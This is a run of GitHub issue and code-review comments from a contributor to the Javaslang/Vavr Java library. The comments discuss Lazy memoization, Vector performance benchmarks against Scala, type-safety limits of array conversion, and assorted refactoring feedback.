(e.g. the scala generation phase)?. Duplicate of: https://github.com/javaslang/javaslang/issues/1544\n. Memoization (mutation / multi threading in general) performance is difficult measure properly.\nI tried to come up with a good benchmarks, but I modified more things than I should quote here, so I created a separate PR for it (since it includes an alternative optimization also).\nI hope you don't mind me hijacking your PR :)\nThe benchmark compares simple eager access (java_eager) to Lazy's first access (slang_lazy) and subsequent, initialized access (slang_inited_lazy):\nThese are the measurements:\n``` java\nBefore:\n    java_eager/slang_inited_lazy  1.17\u00d7\n    java_eager/slang_lazy         6.89\u00d7\nCurrent PR:\n    java_eager/slang_inited_lazy  1.07\u00d7\n    java_eager/slang_lazy         6.56\u00d7\nAlternative:\n    java_eager/slang_inited_lazy  1.02\u00d7\n    java_eager/slang_lazy         6.73\u00d7\n```\ni.e. before is the worst, your solution is faster for first access (and subsequent null values), the alternative is faster after the first access.\nSee: #1577\n. > Please do this change to a separate PR, this little change is really worth it.\nSure :)\n\nthe get() calls will be slower than in #1576.\n\nIndeed, but we're talking about <5% here, no other class is this optimal, I don't think this should be a criterion.\n\nthen the check value == UNDEFINED may not reflect the actual main memory state\n\nYes, the same for null values, but that's what the subsequent synchronized block is for, which checks a volatile field, guaranteeing correctness. Once all the values are out of the cache, the non-volatile field check will suffice as it should only change once.\nIf I'm mistaken, could you please provide a test that fails?\n. > T[] toJavaArray(T[] array)\nBecause of erasure I don't think it's possible to make this completely type-safe.\n\nI think the first, unsafe variant is no viable solution.\n\nDoing it the Java way would result in the same unsafety \njava\n@SuppressWarnings(\"unchecked\")\nOption<Integer>[] options = singletonList(Option.some(1)).toArray(new Option[0]);\nSystem.out.println(options[0].get());\ni.e you cannot call toArray with new Option<Integer>[0] either ...\n. > If an application of toArray(Class) compiles, it is correct.\nUnfortunately that's not true either:\njava\nArray.of(1).toJavaArray(int.class);\nerrs at run time with:\njava.lang.ClassCastException: [I cannot be cast to [Ljava.lang.Object;\nI still think the <? super T> variant was the best compromise.\n. > checking type.isPrimitive() and then decide further how to proceed?\nand throw a different kind of RuntimeException?\n\nSafety first.\n\nI agree, but I don't think it's possible, because of type erasure, it's inherently unsafe :/\n. I actually though about this for some time. The problem with graph modelling is that they inherently contain back references (e.g. cycles), something that complicates persistent data structures.\nI think a sparse Vector or primitive-keyed map would do most of the trick, but we should investigate how others have done it.\n\nHowever, the first questions should probably be:\n- Is there a need for this?\n- Do graphs even need to be persistent?\n- Should we reinvent everything or wrap existing ones.\n  There are lots of other graph libs for the JVM (e.g. https://github.com/apache/giraph (distributed) or https://github.com/twitter/cassovary (space efficient, single machine) - probably neither are purely functional), creating a wrapper around it shouldn't be that hard. But than again, maybe we should be the ones doing that. TBD.\n- Do we care about scalability, i.e. should it connect to http://titan.thinkaurelius.com (Titan is a scalable graph database optimized for storing and querying graphs containing hundreds of billions of vertices and edges distributed across a multi-machine cluster.), like Clojure's http://titanium.clojurewerkz.org/articles/getting_started.html does?\n\n\nIn Coursera's Algorithms II Sedgewick does a good job of introducing different graph concepts - though obviously in non-functional way.\nSkienna has lots of graph theory as well (though I don't like his style very much).\n\n\nClojure and Scala don't have build-in graph support, but are supplemented by lots of libraries - though no mature library seems purely functional (citation needed):\n- Clojure: https://github.com/Engelberg/ubergraph (Ubergraph goes beyond Loom's protocols, allowing a mixture of directed and undirected edges within a single graph, multiple \"parallel\" edges between a given pair of nodes, multiple weights per edge, and changeable weights.)\n- Scala: https://github.com/scala-graph/scala-graph (doesn't seem mature enough)\n\nHaskell has some purely functional graphs:\n- http://hackage.haskell.org/package/fgl\nSee also: Fully Persistent Graphs \u2013 Which One To Choose? - 2006 - https://pdfs.semanticscholar.org/522a/7d1cb5654bb474e5de3741eef36bc0a86f49.pdf\n. Cool :)\nThe backreferences might be a problem, because you cannot easily change a node, without changing the whole cycle it belongs to (e.g. imagine a simple Javaslang List, that wraps around (i.e. last points to first). In that case you cannot add a new element to it in a persistent way in constant time - only by ruining the original or copying everything).\n\nboolean isDirected();\nboolean isWeighted();\n\nAn unweighted graph is simply one where all the weights are equal.\nAn undirected graph is simply a symmetric directed one.\nI know in general algorithms this is how they are stored, but can't we reuse abstractions somehow (e.g. in the same wasy as a Set is a Map, with a dummy value)?\nWe could have a general graph that could store positive/negative weights (e.g. see Floyd-Warshall) that is directed and can contain parallel edges with different weight types (e.g. nodes are cities and edges are different route types, i.e. accessible by foot, by car, by plane, not just simple numeric weights).\nSpecial cases (e.g. undirected/unweighted nodes) could be optimized for every node/edge in particular, so that the user doesn't have to know (i.e. special interfaces could give access to a single subset of the method, providing a undirected/unweighted view, having the advantage of a single implementation).\nI know you strive for simplicity and not for one-ring-to-rule-them-all solution, and I think my abstraction has potential in this area.\n. I think we're trying to fix a bug that's not ours, in a way that would make it even more complicated (i.e. that won't be an int.class, it will be an Integer.class).\nPeople may be interested in converting a Vector<Integer> to an int[], and will get more confused this way :/\n. yeah, but other functionality might not work from JOL, dunno yet.\n. @danieldietrich why was this closed?\n. +1 for a Gradle build, though that's not the source of slowdown.\nOur build is not very complicated, should be doable in a few days :) (I've done more Maven to Gradle transitions that I'm proud to admit ...).\nAlso, if you cherrypick locally and commit the result only once, it would result in a single build.\n. @danieldietrich, why do you think Gradle will make the tests run faster?\n. As mentioned previously, you can do that today also, by cherrypicking everything locally, and push only at the end.\nI don't think Gradle will do anything differently here. \nIf Travis supports it, we may try parallel tests, however :) (probably possible in Maven also) \n. @ruslansennov, @danieldietrich, @valery1707, we should add these possibilities to the aliases also and provide a convenient way of extending it to more than 10 elements.\nI suggest making merge a vararg, to allow comfortable concatenation :)\n. @ruslansennov, what' the source of confusion?\n. @danieldietrich, the difficulty of implementing the takeWhile originates from the impotence of the Iterator interface.\nIt would be a trivial implementation, if the collections would implement an abstract toStream instead (where we shouldn't cache next() in hasNext(), as head() won't consume anything), and the iterator() would be implemented in Value, calling toStream().iterator().\n. > we need to take care of i de mpotence of hasNext\nI think we could avoid it by working with Streams instead\n. @danieldietrich, rebased :)\n. > We should not modify the existing prepend() and append() both in Vector and BitMappedTrie.\nI appreciate your feedback, @danieldietrich, it made previous implementations a lot more readable.\nTo be on the same page, I urge you to spend some quality IDE time with this commit or maybe merge-and-change it, so that you familiarize yourself with it.\nI would like to stress that this is inherently a very complicated system, I've spent months simplifying it.\nIf you could try to refactor it in your IDE, I'm sure you would appreciate all the optimizations I have't done! :)\n\nI think that append() for example is a much more commonly used operation. We should not make it that much slower!\n\nI agree, though we need to give a possibility for people to optimize.\nRemoving the leading and trailing arrays made the code a lot simpler, but append got ~100x slower than the mutable counterpart. This commit fixes this discrepancy in a lot more elegant way.\nWe cannot convince people to go functional, when they see that their application could experience two orders of magnitude slowdown. Tackling this is inherently complex.\n\nI'm not sure if the ClassCastException related change is the right way to go. \n\nThe problem is that I need to change the underlying structure during iteration, whenever an illegal value is found. If you can recommend a simpler way (via an Iterator, that already consumed the illegal value), I would really appreciate it.\nI could iterate over everything to check for inconsistencies and again to add the values. That however would slow down the happy path (i.e. you can add the new element without problem).\n\nIt adds additional magic that is not transparent to a user. \n\nThe users don't have to know about this, but should be able to take advantage of it (e.g. by using the alternative iteration to avoid boxing). If in the future we decide to remove it, the users won't really be affected (only memory- and speedwise).\n\nThat is really evil.\n\nPlease advise an alternative way, without making it an order of magnitude slower. Our users expect us to sacrifice some of our comfort for theirs, i.e. if it's more difficult for us, but a lot simpler for them, we should go for it!\n\nare these methods really bottlenecks in their specific applications? \n\nYou need to create a vector to be able to use it. This commit is about creating vectors an order of magnitude faster! People need to have alternatives.\n\nlove implementations that are dead-simple and where the performance directly comes from the most basic data structures, like Tries. \n\nDaniel, tries are not simple! Please take a look at any other implementation (I recommend Scala or Clojure). Our methods are usually far simpler - though we provide a lot more functionality than any of them.\nPlease spend some IDE time with this so that you can get convinced - or to convince me!\nThe interface of Vector hasn't changed, we can always revert in the future, if some parts turn out to be unmaintainable.\nUntil then there is no point in being afraid, I think this is rather exciting :)\n. Hmm, strangely it seems that the new Scala 2.12.0 Vector is significantly slower in a few cases (e.g. tail, slice, update, append, prepend). @djspiewak, what could be the reason for that?\nDisplaying speed ratios Javaslang Vector ops/s / Scala Vector ops/s (greater value means Javaslang is faster):\n2.11.8:\njava\nOperation     10    100   1026 \nCreate     7.13\u00d7  7.92\u00d7  7.70\u00d7\nHead       0.79\u00d7  0.59\u00d7  0.49\u00d7\nTail       2.64\u00d7  3.49\u00d7  4.55\u00d7\nGet        1.09\u00d7  1.03\u00d7  0.71\u00d7\nUpdate     1.21\u00d7  1.07\u00d7  0.76\u00d7\nMap        1.21\u00d7  1.18\u00d7  1.43\u00d7\nFilter     1.47\u00d7  1.55\u00d7  1.38\u00d7\nPrepend    0.09\u00d7  0.08\u00d7  0.08\u00d7\nAppend     0.15\u00d7  0.10\u00d7  0.08\u00d7\nAppendAll  2.79\u00d7  1.52\u00d7  1.67\u00d7\nGroupBy    1.25\u00d7  1.17\u00d7  0.92\u00d7\nSlice      2.45\u00d7  3.13\u00d7  4.87\u00d7\nIterate    2.03\u00d7  0.88\u00d7  1.43\u00d7\n2.12.0:\njava\nOperation     10    100   1026\nCreate     6.68\u00d7  5.64\u00d7  5.77\u00d7\nHead       0.79\u00d7  0.64\u00d7  0.48\u00d7\nTail       5.68\u00d7  7.67\u00d7  8.71\u00d7\nGet        1.03\u00d7  1.05\u00d7  0.78\u00d7\nUpdate     2.64\u00d7  2.72\u00d7  1.78\u00d7\nMap        1.37\u00d7  1.08\u00d7  1.31\u00d7\nFilter     1.22\u00d7  1.45\u00d7  1.16\u00d7\nPrepend    0.18\u00d7  0.18\u00d7  0.17\u00d7\nAppend     0.31\u00d7  0.20\u00d7  0.20\u00d7\nAppendAll  3.57\u00d7  1.87\u00d7  1.71\u00d7\nGroupBy    1.52\u00d7  1.31\u00d7  1.13\u00d7\nSlice      4.96\u00d7  8.52\u00d7 10.71\u00d7\nIterate    1.84\u00d7  1.42\u00d7  1.30\u00d7\n. @viktorklang, tried it separately with the final 2.12.0 and 2.11.8:\nScala slice for 1026 elements:\njava\n@Benchmark\npublic void scala_persistent(Blackhole bh) {\n    scala.collection.immutable.Vector<Integer> values = scalaPersistent;\n    while (!values.isEmpty()) {\n        values = values.slice(1, values.size());\n        values = values.slice(0, values.size() - 1);\n        bh.consume(values);\n    }\n}\nresults in\njava\n8,267.31 ops/s - 2.11.8\n4,132.78 ops/s - 2.12.0\nwhile Javaslang's speed stays:\njava\n44,629.03 ops/s\n. @viktorklang, @SethTisue, @Ichoran, @djspiewak, @danieldietrich, the slowdown seems to have happened in 2.12.0-M2 (4,528.84 ops/s), as in 2.12.0-M1 it was still 9,470.62 ops/s.\nM2 changelog: http://www.scala-lang.org/news/2.12.0-M2\n- Beginning with 2.12.0-M2, the Scala 2.12 series targets Java 8.\n. Could this be the problem: https://github.com/scala/scala/commit/bb4b79c5d1f6bffc2ad6e8466be2dce6a44c0fcb#diff-59f3462485b74027de4fd5e9febcc81bR136 ?\n. @viktorklang, @SethTisue, @Ichoran, @djspiewak, @danieldietrich, I've recompiled Scala 2.12 with the Vector from 2.11, and the above methods are either slower or the same.\nI'm afraid the slowdown has a more serious cause, which I'm not yet qualified to investigate :/\n. @Ichoran, @SethTisue, @viktorklang, @odersky, @djspiewak, @danieldietrich, @zsolt-donca\nTo sum it up, comparing the JMH benchmarks for 2.11.8 with 2.12.0, there seems to be a measurable slowdown in some Vector operations for all GCs, i.e.\ne.g. ops/s for 1000 slice operations - 2.11.8 vs. 2.12.0:\njava\nGC type             2.12 / 2.11  ops/s ratios\nUseParallelOldGC    78%          (8228 / 10563)\nUseConcMarkSweepGC  63%          (7167 / 11320)\nUseG1GC             49%          (4695 /  9482)\n(See https://github.com/paplorinc/ScalaVectorBenchmark/commit/918f75bdaf439a0ed3453e968edec3ed08efbe9b)\nNote: There still appears to be room for optimizations, seeing that the Javaslang persistent Vector's slice is ~5-10\u00d7 faster\n. @Ichoran\n- how can the selection of GC affect the results so much in the new, but less in the old case?\n- is this a general slowdown? Why wasn't it detected by other benchmarks?\n- can I help in any way?\n. Shouldn't the transposition of a transposition equal itself? How can you achieve that with a CharSeq?\nAnd if we can transpose a Queue, why not a (Bit)Set or Tree or Map?. Should we even handle incomplete rows?. > I don't think it makes sense to add transpose to collections that aren't indexed\nOnly Array, Vector and CharSeq are indexed, and CharSeq cannot hold matrices, so only the first two qualify (though I think List should be fine also). - To make this mergeable, please rebase on master\n- Only push, once all tests are passing\n- Commits should contain coherent units of work. Please reorder you commits logically, not incidentally, i.e. if you've made a mistake in your previous commit, edit that one and force push, instead of creating many altering commits - it helps the reviewer.\n. Another option nobody mentioned: let's treat null as if it were -0.0F ... or false ... or a space character ... or NaN ... or a Void[]{} ... or a transaction of 0 dollars from \"Jane Doe\" to \"John Smith\" through the Null Islands!  \nWe could then return 0 for the average or min for an empty collection AND if it only contains a null ... we would correct so many mistakes automagically!\n\nJoking aside, as @danieldietrich already witnessed several times, I don't like  nulls and I would eliminate most null checks  (probably even Objects.requireNonNull calls and simply state in the documentation that \"null will result in undefined behavior\"), and especially the above abominations, where null is treated as a default value automagically! :). Hey @danieldietrich :),\nCongrats for your new baby, I wasn't expecting you to respond so quickly :).\nThis change addressed a few things I noticed while using the Vector and the changes are mostly algorithmic, therefore no external examples would be needed.\nAppend didn't know the size of the iterable, therefore it allocated a whole new array of 32 until now. This change limits that to the given size, no additional nulls at the end of the Vector after append.\nThe speed of append is now a lot faster than in any version (except with the leading and trailing, of course), and the code is also more intuitive, no more MutableInt counting necessary.. @sputnikci, you're killing me :)). Thanks @danieldietrich, but I hope you agree with that the code got better also, clean code is first priority for me, speed is second :). Wow, the build was fast, congrats @danieldietrich :). Found this: https://infoscience.epfl.ch/record/169879/files/RMTrees.pdf\nWill investigate it :). And the actual PDF also https://github.com/nicolasstucki/scala-rrb-vector/raw/master/documents/RRB%20Vector%20-%20A%20Practical%20General%20Purpose%20Immutable%20Sequence.pdf. The name Radix-Balanced tree is far better than Bit-Mapped trie :). It seems to me that this paper's method makes it possible to modify anything in the middle of the collection in a sublinear way, but all other speeds are same or lower, according to the charts.\nWill try to use their impl to benchmark it against our Vector, shortly :). @danieldietrich, whenever you're sad that our Vector is complicated, please take a look here: https://github.com/nicolasstucki/scala-rrb-vector/blob/master/core/src/main/scala/scala/collection/immutable/rrbvector/RRBVector.scala .\nIt's a lot nicer than the current Scala version, but also a lot more complicated :/. What should happen with the illegal methods, e.g. remove when they're backed by an immutable collection?. Theoretically we could, but wouldn't it be very counter-intuitive, e.g.\njava\nfinal java.util.List<T> list = source.toJavaList();\njava.util.Collections.shuffle(list);\nwould either throw new UnsupportedOperationException or would shuffle a linked list in O(N^2) time . > If someone wants to get a mutable Java Map out of a Javaslang Map, that's what toJavaMap()\nBut if we give them a wrapper, they won't get a mutable Map. FYI: @danieldietrich, @seanf: https://github.com/javaslang/javaslang/pull/1736. @danieldietrich, please check my solution at https://github.com/javaslang/javaslang/pull/1736/commits/28d5c60eb3139d361163858c957ec27acecd2f6b. @danieldietrich, it's difficult to code in the browser, do you think it would be easier if you would merge the PR and change those instead?. > The one bad thing with throwing RuntimeException is that it happens at runtime.\n:+1: \n\nIf the user needs unmodifiable versions he may call one of the unmodifiable*() helpers in j.u.Collections. \n\n:+1:, haven't thought of that!\n\nSummed up I see only pros.\n\nLet me give a few additional pros and cons to make your list more balanced :)\nPro:\n The user expects a mutable java List, as that's what he's used to. By trying to access the last element via the listiterator (which is possible in an ArrayList and the doubly linked LinkedList), he will be surprised that it's linear - minor issue in my opinion.\n using it the view for a small Vector as if it were mutable will result in linear append - still a minor issue\n* the advantages of persistence (i.e. that mutations don't propagate globally) is not preserved\nPro:\n Users can convert to and from the java world (we may want to optimize for these cases when users want to convert back to immutable views) basically for free\n Immutable collections can be disguised as mutable ones when giving it out to the world. > Which is your biggest fear / what can go wrong? Or is it only \"but the other guys do it the other way\"?\nProud of you @danieldietrich, I like it when we dare to be pioneers!. @danieldietrich, we should create real-world tests to see how both feel and decide later.\nI'm ok with both, though I like your new approach more now that I've tried it (i.e. the mutable, backed by immutable).. I agree that both alternatives have value (mutable and throwing), but combining them makes this more than simple delegation, which I find worst than any simple alternative.. @seanf, please review, is this what you meant? :). I did most of what you asked, could you (or anyone else) please do the rest in a separate PR, this is already getting too big.\nIt needs lots of tests also.\n\nCould you please check if List(1, 2, 3).asJava().removeAll(Arrays.asList(1, \"a\")); does throw? \n\nIt doesn't throw, it removes 1 internally.. @danieldietrich, pushed a new version, please review everything.. @ruslansennov, @danieldietrich, @seanf, @zsolt-donca, @emmanueltouzery  squashed the history to a single commit that adds the new conversion method to Array, Vector and List.\nCurrently there's a constant that decides whether we throw or modify.\nMy personal preference would be to only do one, but that can be decided at a later stage.\nI will be gone for a few days, I think this can be merged as it is (Set, Map and MultiMap weren't affected).. Thanks @seanf, awesome comments, will check them out once I'm home.\n@danieldietrich, could you please react to the ones that I don't have the knowledge/authority to decide :)?. @danieldietrich, should I close this attempt?. Could you please elaborate on why it's linear? Only edits are linear for n < 32 (the same is true for any collection, e.g. an ArrayList is linear for n = 1)\n\nOur benchmark state nothing at all.\n\nWe have benchmarks for small number of elements also.. Thanks @seanf :). The problematic test case is:\n```java\nprivate static final CheckedFunction5 recurrent1 = (i1, i2, i3, i4, i5) -> i1 <= 0 ? i1 : CheckedFunction5Test.recurrent2.apply(i1 - 1, i2, i3, i4, i5) + 1;\nprivate static final CheckedFunction5 recurrent2 = CheckedFunction5Test.recurrent1.memoized();\n@Test\npublic void shouldCalculatedRecursively() throws Throwable {\n    assertThat(recurrent1.apply(11, 11, 11, 11, 11)).isEqualTo(11);\n    assertThat(recurrent1.apply(22, 22, 22, 22, 22)).isEqualTo(22);\n}\nwhich does seem broken, i.e. it should modify the `cache`, while it's already modifying it :/.\nDo we really need this functionality?. The tests fail forEuler 67 also:java\nprivate final static Function3>, Integer, Integer, Integer> smart = Function3.of(\n        (Vector> tr, Integer row, Integer col) -> {\n            int value = tr.get(row).get(col);\n            if (row == tr.length() - 1) {\n                return tr.get(row).get(col);\n            } else {\n                return value + Math.max(Euler67Test.smart.apply(tr, row + 1, col), Euler67Test.smart.apply(tr, row + 1, col + 1));\n            }\n        }\n).memoized();\n```\nsince it calls itself also.\n\nI think therefore that memoization was working incorrectly before also (i.e. calculating things twice), but in Java 9 they seem to have added a validation check to avoid this.\nWill provide a PR to ask for comments.. @danieldietrich:\nIt seems to me that we cannot easily support recursive memoization: http://mail.openjdk.java.net/pipermail/core-libs-dev/2015-February/031237.html. Yes, all the tests passed on JVM 9 (though the build fails because of the Scala code generation).\u263a\ufe0f. > Vararg Morghulis\nVararg dohaeris!. I'm afraid this is as optimal as it gets. The tree is lazily calculated on every dequeue, you cannot currently iterate it otherwise, just by removing elements from it.. What do you base your assumption, of GC pressure?\nHave you measured whether the garbage is eliminated by escape analysis, or is it just a hunch :)?. The ambiguity would also be in case of the API support.\nI don't mind, I respect that the final decision is yours. :). Had to fix some ambiguous null tests, should be ok now :). ... that was a long build :). @danieldietrich, updated Scala and friends to make the comparisons more fair (i.e. to include the optimizations I've done for Scala also), posted the results in the description: https://github.com/javaslang/javaslang/pull/1832#issue-202340255. > Merging #1833 into master will increase coverage by 0.16%\nGood job!. Next: \n\n\nhttps://codecov.io/gh/javaslang/javaslang/src/1673bb6398dd7ad67a918b3778054736177e8f7d/javaslang/src/main/java/javaslang/collection/HashArrayMappedTrie.java#L477\n@ruslansennov, could you please help us in identifying why these lines aren't covered?\n\n\nhttps://codecov.io/gh/javaslang/javaslang/src/1673bb6398dd7ad67a918b3778054736177e8f7d/javaslang/src/main/java/javaslang/control/Either.java#L266\nThere are a few worrying omissions here, too. Thanks @ruslansennov! :)\n@danieldietrich, how can we achieve 98%? Would be awesome!\n@AlparSzabados, you up for some more small wins like these? :). @codecov-io \n\n. Another 0.12% codecov increase, we're almost at 98% :)\ncc: @AlparSzabados . Since all these are generated, I pushed a PR containing a partial fix: https://github.com/javaslang/javaslang/pull/1848. @hamnis, could you please take a look at the PR?. @danieldietrich decides :). yup, doing it as we speak :). I think this could be generalized via a default-if-empty method (maybe in Traversable):\njava\npublic CharSeq defaultIfEmpty(CharSeq defaultValue) {\n    return isEmpty() ? defaultValue : this;\n}\npublic CharSeq defaultIfEmpty(Supplier<CharSeq> defaultValue) {\n    return isEmpty() ? defaultValue.get() : this;\n}\ngiving the following solution to your problem (with API.CharSeq static import):\njava\nCharSeq(\"000000000\")\n       .dropWhile(is('0'))\n       .defaultIfEmpty(CharSeq(\"0\"))\n       .mkString();\n-> 0\n\n\njava\nCharSeq(\"000000000\")\n       .defaultIfEmpty(CharSeq(\"0\"))\n       .mkString();\n-> 000000000\nWhat do you think, @danieldietrich?. Interesting, I didn't know about this data structure.\nIf I'm mistaken correctly, it's mainly the logarithmic insert/delete that's better than normal String, right?\nWe've had a similar experiment, i.e. an \"immutable StringBuilder\" with Vector as a base, but it didn't materialize.\n@danieldietrich, what do you think, is this different enough to give it a trie (pun intended)?. > \"Making general purpose Java programming more efficient\".\nMake Java great again!. Could you please provide more info?\nHow would automatic stackless recursion be possible on the JVM?. In what language is the above example written in?\nIt's certainly not Java, it lacks several return statements and braces, the wrapper Integer seems pointless and it's not even formatted properly... and worst of all, it's not stack safe, it simply calls itself, which introduces a new stack element (several actually) for each call.. I have seen it, it's still not Java :). I doubt it, they just probably haven't checked the code .... Why do you think this will avoid the stack exactly?. Related: https://medium.com/@johnmcclean/trampolining-a-practical-guide-for-awesome-java-developers-4b657d9c3076\n. > It gets very, very slow if the load factor approaches 1\nThe mentioned article addresses this with a logarithmic worst-case probing\n. a few notes:\n if we store Vector<Tuple<K, V>>s in the nodes, we cannot take advantage of primitive support\n   * unless we generate corresponding Tuples also\n   * or we store the K and V in separate Vectors (we might lose cache locality this way)\n   * we could store two arrays in a specialized BMT somehow...\n we could use BitSet to store info about the values, e.g. was it deleted or not (is needed for linear probing)\n   * currently BitSet update is linear, maybe we should base it on Vector also, as suggested in #1486 \n* we may want to use better hashing than a simple modulo\nI will experiment with these, please share your findings also :). Wow, really nice progress!\nFor simple iteration I'm not surprised that modifying persistent structures was slow :)\nGood job!!! :). Package name changes are meant to ensure that multiple versions can coexist on the same classpath.\nIt's a workaround for the lack of proper Java modularization.\nJava 9 is meant to mitigate that somehow.\nI also hope there's no need to rename packages, but a backwards compatibility build plugin would be a good idea (I don't know of any such tool for Java, though).. Thanks for the documentation :)\nWhat is the GWT project's purpose than, if you rather recommend other libs for javascript programmers?. hey @chronodm,\nWe have actual, non-envelope JMH performance tests for Vector.\nYou can check the file's history for measurements (locally, GitHub doesn't follow renames), or run them yourself.\nRemoval of any element should be at most O(n), and many other effectively constant operations are actually log32 (which is always so small (<7) that you can treat it as if it were a constant)\nFor simple performance characteristics check out https://github.com/vavr-io/vavr/blob/master/vavr/src/main/java/io/vavr/collection/package-info.java (as JavaDoc)\nIf you think something is missing, please let us know :). The JDK 9 additional build is a very good idea, let me do that quickly :). @valery1707, if you're stuck, you could create more PRs for the same issue.\nAlso, check the codebase for synchronizations and concurrent code (including atomic ones) and add those to the suite, too :)\nSeem like a good job so far!. hmm, but this makes it eager, what's the advantage of that?\n. maybe memoize, if you think this is an expensive, often called method\n. In my opinion you should follow the author's style for imports instead\n. I think I answered that below\n. I'm wondering why didn't size use nodeCount before? (there seem to be other related size calculations here also, maybe unify them?)\nBy memoization I meant lazy init in this case, sorry.\n. I'm not sure I can follow, it seems to me that the two calculations are exactly the same (recursive iteration in both cases).\n- The current impl is faster, if you call size 0 times\n- The new imp is faster if you call it > 1 times\nWith Lazy would be the best of both worlds.\nIn the constructor (or rather after the field)\nJava\nsize = Lazy.of(() -> nodeCount());\nand use it as:\nJava\npublic int size() { return size.get(); }\n. @danieldietrich, should we convert all computationally expensive operations (like size) to memoized Lazy?\n. Hmmm... I don't see why a Lazy should be a real compromise, get-ing its value should be a lot faster than recalculating a tree/map/list size.\nIf it is, maybe we should change the double-check locking in Lazy#get (which many consider an anti-pattern anyway) to a static singleton.\nI will experiment with it, let's see what the performance is of both :)\n. Lazy is pretty fast already, but may slightly be optimized by minimizing the volatile reads, like:\nJava\n@Override\npublic T get() {\n    T result = value; // volatile field is accessed fewer times this way\n    if (result == null) {\n        synchronized (this) {\n            result = value;\n            if (result == null) {\n                result = value = supplier.get();\n                supplier = null; // free mem\n            }\n        }\n    }\n    return result;\n}\nthough that will imply that the Supplier may not return null.\nEDIT: I tried several microbenchmarks, but I couldn't consistently show that the above 'optimization' it is faster :(. The lazy evaluation is ~4x slower than simple field access, though still pretty fast.\nMemory-wise they seem comparable (I serialized a List of Integers and Lazy<Integer>s):\nList of Integers: 5 bytes / entry\nList of (un)initialized Lazys: 12 bytes / entry\n. Kinda' unrelated, but why is this a default method exactly?\n. Hmm, do you have an article which explains this in more detail, sounds interesting. If not, you should write one (maybe even in the Javaslang documentation, if you think it adds functional value to Java) :)\n. So you're simply using it for multiple implementation inheritance (traits style), right?\n. M = Map\nR = Result\nwe will probably need it for non-maps also (e.g. Queues)\n. else if instead of if signals to the user that the branches are mutually exclusive\n. single cast\n. confusing ternary-in-ternary\n. if init is R, than initOption should be Option<R>\n. let's eat our own dogfood :)\n. this is better than casting\n. this doesn't return M, therefore it can be implemented in the parent, where which has T already.\nNote: reducing the number of method decreased the code coverage slightly.\n. logic was copy pasted\n. this seems very mutable, but that might be on purpose\n. inverted the condition\n. if we don't want to expose this (i.e. no protected in interfaces), maybe we could import it statically (though we won't be able to access isEmpty then, and there would be no advantage of having this method...)\n. please amend your previous commit instead, in case you made a mistake.\n. You might want to do it in a functional way instead.\nThe error in your previous code is probably that you ignored the result of the append.\nPlease only commit, when all tests are passing.\nJava\npublic Seq<CharSeq> split(String regex, int limit) {\n    Array<String> wrap = Array.wrap(back.split(regex, limit));\n    return wrap.map(CharSeq::of);\n}\n. in my opinion they will represent the same thing.\nWill rename back :)\n. No, I'm using Idea, with the imported settings, I just have Align when multiline enabled everyhere.\nWould you like me to revert this part?\n. indeed, thanks!\n. this was needed to unapply the default method.\nTODO: this needs an @Override also\n. yup, that's what I did\n. Done, pushed a new version, squashing the changes (as the rename isn't separated anymore).\n. made it symmetric with lastOption\n. good call, done :)!\n. fixes https://github.com/javaslang/javaslang/issues/1272\n. should rather be\nJava\nObjects.requireNonNull(throwableSupplier, \"throwableSupplier is null\");\n. next was't covered by tests\n. asking the question changed the answer...\n. iterator was basically used as a supplier\n. used the internal HashSet instead\n. of accepts CharSequence, no need for explicit .toString()\n. let's use the methods we've already defined :)\n. this condition is only false for the first statement: let's extract that to simplify and optimize the logic\n. Constant String concatenations are StringBuilder-ed automatically\n. related to https://github.com/javaslang/javaslang/issues/1252\n. this was wrong, the rest were just inconsistent :)\n. Will add local finals all over the code in the cleanup commit, if that's how you prefer it :)\nI think Java is going in the 'implicitly final' direction though, but I can see how this will add value also.\n. cast is needed, as return value is the same as the subclass, which isn't available in the parent class.\nAlso, in case of trait-like inheritance, it seems that only the directly declared parents are accessible (hence all the delegating methods)\n. as a bonus, this always results in the same empty() instance (if that's the case), with the new implementation\n. unrelated, but useful\n. this is where the magic happens :)\n. changed most filter methods to return empty, if possible.\nThis affects many other methods also.\n. this is another exciting change :)\nE.g. for a LinkedList it had a complexity of O(elements.size * size()).\nNow it's O(elements.size + size()). For sets it is reduced to the size of the smaller set.\n. isSameAs(src) and not isSameAs(expected) since not all Traversables are consumable multiple times\n. this reduces the complexity of intersect to the size of the smaller set (used for containsAll also)\n. it seems a lot more logical to me to append to queues and convert those to lists at the end - i.e. only moving forward, without reversing everything twice.\nOr you mean that Queue already has two Lists inside? Ok, will change it back.\n. how about\nJava\nreturn ofAll(iterator().intersperse(element));\n. you could turn the formatter off before and on after ... but ...\n. Good point, pushing a change now\n. pushed\n. renamed for consistency\n. done in separate commit\n. done in separate commit\n. unrelated typo\n. we could test only the Option alternatives, since they're only delegating. Your choice.\n. could you please separate computations from string concatenation?\n. Could you please explain what the advantage is of removing a format in case of an exception?\nI don't think It needs to be faster and I don't think the rest of the code is GWT compliant (I got 3 Java 8 compiler errors during development only, I doubt GWT can handle it...). But I might be wrong also :).\n. unrelated, but requested last time by @danieldietrich :)\n. this is the actual fix, replaced the impl with the new one (added back old tests also)\n. unrelated: organized imports for JavaDoc also\n. this is the essence - used new function for old impl also\n. this is the essence - used new function for old impl also\n. added tests back for the deprecated methods too\n. tests for old methods, with disabled deprecation warning (the build won't pass otherwise)\n. wouldn't build otherwise ...\n. tests for old behavior also\n. should we worry that the regex is recompiled every time? (though simple (one char) regexes seem to take a fastpath)\n@danieldietrich\n. yeah, I checked it also, but Pattern.compile(regex) doesn't cache, AFAIK\n. package private access\n. what should we do when the compiler crashes?\n. unrelated, done in a separate PR also\n. unrelated typo\n. same complexity, but seems more intuitive\n. extracted to parent\n. we have multiple Queue implementations now, maybe we can extract common functionality this way somehow\n. DRAFT is the keyword here.\nPlease tear it to pieces :)\n. // TODO\n. this seems expensive...\n. the original algorithm from http://www.brics.dk/RS/96/37/BRICS-RS-96-37.pdf\n. its simpler to verify it this way, will refactor once it's stable\n. not sure when to return List<Node<Ranked<T>> and when to wrap it in a PriorityQueue.\nFor now private methods (with intermediary stages) use the List, public methods accept and return PriorityQueue.\n. strange mix of metaphors :))\n. Will investigate the depth of the recursion and whether it can cause Stack overflow\n. size is something like\nJava\nforest.map(Traversable::size).sum().intValue()\n. yup, thanks\n. @danieldietrich, opinion?\nThe Queue interface doesn't change.\n. Will add them back and add an @Override :) (in 3.0 we can simply delete the overridden impls).\nEDIT: I think some methods were already moved up the chain to default methods in other commits. Not sure why that's a problem, though\n. single elements can also be kept\n. expanding the foldLeft and getting rid of the lambda in this critical section made a small, but measurable difference\n. PriorityQueue doesn't seem like a 